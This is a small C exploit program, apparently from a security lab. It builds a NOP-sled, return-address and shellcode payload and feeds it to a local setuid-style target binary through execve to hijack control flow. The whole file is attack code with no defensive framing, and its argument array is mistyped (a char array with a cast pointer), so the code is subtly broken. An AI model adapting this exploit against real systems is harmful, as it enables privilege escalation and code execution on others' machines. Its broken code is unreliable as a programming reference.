#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"
const char* TARGET = "/srv/target3";
const char* SLED = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
const char* ADDR = "\xc0\xde\xff\xff";
char* prep() {
char* buf = malloc(strlen(SLED) + strlen(ADDR) + sizeof(shellcode) + 1);
sprintf(buf, "%s%s%s", SLED, ADDR, shellcode);
return buf;
}
int main(void) {
char args[] = {(char)TARGET, prep(), NULL};
char *envp[] = {NULL};
if (execve(TARGET, args, envp) == -1) {
    perror("execve failed");
}

return 0;
}